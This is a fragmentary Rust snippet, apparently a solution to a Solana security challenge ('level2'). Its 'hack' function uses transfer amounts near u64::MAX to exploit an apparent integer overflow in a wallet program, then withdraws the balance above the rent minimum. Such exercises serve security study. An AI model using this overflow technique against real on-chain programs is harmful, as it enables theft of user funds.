...
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program, sysvar, rent::Rent};
...
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    ...
    assert_tx_success(
        env.execute_as_transaction(
            &[level2::initialize(challenge.wallet_program, challenge.hacker.pubkey())],
            &[&challenge.hacker],
        )
    );

    let acc_balance = env.get_account(hacker_wallet_address).unwrap().lamports;


    for i in 1..20 {
        let amount = u64::MAX - acc_balance + i;
    ...
    let hacker_balance = env.get_account(hacker_wallet_address).unwrap().lamports;
    let acc = env.get_account(hacker_wallet_address).unwrap();
    let size = acc.data.len();
    let min_rent = Rent::default().minimum_balance(size);
    let amount= hacker_balance - min_rent;
